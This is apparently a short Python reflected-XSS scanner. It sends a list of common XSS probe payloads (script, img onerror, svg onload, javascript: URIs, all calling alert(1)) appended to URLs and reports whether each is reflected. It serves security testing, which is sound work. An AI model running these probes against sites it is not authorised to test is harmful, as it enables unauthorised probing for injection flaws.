import requests

# List of common XSS payloads
xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<a href='javascript:alert(1)'>click me</a>",
]

def test_xss(url):
    for payload in xss_payloads:
        # Sending the payload to the URL
        response = requests.get(url + payload)
        if payload in response.text:
            print(f'XSS Vulnerability found with payload: {payload} at {url}')
        else:
            print(f'No XSS vulnerability found with payload: {payload} at {url}')

def scan(target):
    # Check if target is a valid URL, IP, or domain
    if not target.startswith('http'):
        target = 'http://' + target
    print(f'Scanning target: {target}\n')
    test_xss(target)

if __name__ == '__main__':
    targets = [
        'http://example.com/',
        'http://test.com/',
        '192.168.1.1',
        'http://mydomain.com/',
    ]
    for target in targets:
        scan(target)